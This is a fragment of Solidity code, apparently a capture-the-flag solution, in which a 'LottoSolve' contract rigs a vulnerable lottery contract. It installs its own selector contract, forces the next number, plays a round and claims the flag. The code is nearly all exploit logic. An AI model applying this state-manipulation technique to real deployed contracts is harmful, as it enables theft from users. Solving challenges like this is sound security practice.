...
contract LottoSelector {
    ...
    function select(uint8 id) public {
        vuln.setNextNumber(id);
    }
}
...
contract LottoSolve {
    Andes vuln;
    LottoReceiver receiver;
    LottoSelector selector;
    ...
    function attack( bytes32 token) public {
        selector = new LottoSelector(address(vuln));
        vuln.setNextSelector(address(selector));
        selector.select(0);
        receiver = new LottoReceiver(address(vuln));

        vuln.playRound();
        receiver.getFlag(token);
    }
}
